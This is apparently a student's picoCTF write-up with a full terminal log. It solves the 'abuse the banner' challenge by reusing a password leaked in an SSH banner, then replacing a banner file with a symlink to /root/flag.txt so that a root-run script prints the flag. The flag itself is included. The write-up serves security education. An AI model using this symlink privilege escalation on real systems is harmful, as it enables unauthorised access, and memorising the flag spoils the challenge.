## Objetivo
Can you abuse the banner? The server has been leaking some crucial information on `tethys.picoctf.net 60744`. Use the leaked information to get to the server. To connect to the running application use `nc tethys.picoctf.net 61086`. From the above information abuse the machine and find the flag in the /root directory.
## Solución
```bash
ericdiazdeleon@2806-103e-0013-33e9-b535-6a1f-5403-1770:/var/home/ericdiazdeleon/Documentos/Tareas/NotasFundamSeguridaDeLaInfo$ nc tethys.picoctf.net 60744
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234

Protocol mismatch.

ericdiazdeleon@2806-103e-0013-33e9-b535-6a1f-5403-1770:/var/home/ericdiazdeleon/Documentos/Tareas/NotasFundamSeguridaDeLaInfo$ nc tethys.picoctf.net 61086
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
Jhon
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
John Draper
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ ls -la
ls -la
total 20
drwxr-xr-x 1 player player   20 Mar  9  2024 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
-rw-r--r-- 1 player player  114 Feb  7  2024 banner
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
cat text
keep digging
player@challenge:~$ ls -la /root
ls -la /root
total 16
drwxr-xr-x 1 root root    6 Mar 12  2024 .
drwxr-xr-x 1 root root   29 Mar 11 19:34 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar 12  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
player@challenge:~$ cat /root/script.py
cat /root/script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

player@challenge:~$ rm /home/player/banner
rm /home/player/banner
player@challenge:~$ ln -s /root/flag.txt
ln -s /root/flag.txt
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
player@challenge:~$ ^C
ericdiazdeleon@2806-103e-0013-33e9-b535-6a1f-5403-1770:/var/home/ericdiazdeleon/Documentos/Tareas/NotasFundamSeguridaDeLaInfo$ nc tethys.picoctf.net 61086
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}

what is the password?
^C
```
## Notas Adicionales
Lo primero que se realizo fue hacerle netcat a los dos puertos diferentes, donde uno nos pide una contraseña y el segundo nos da la contraseña. despues de eso observamos los archivos y vemos que la flag esta en la carpeta root pero no tenemos los permisos necesarios para acceder a ella, por lo que al observar el script vemos que siempre que se inicia el netcat a ese puerto en especifico se manda a llamar al banner, por lo que si borramos el baner y hacemos un link a flag.txt esto hará que cada que se abra la conexion con el puerto `61086` usando el netcat esto nos proporcionara' la flag.
`picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}`
### Referencias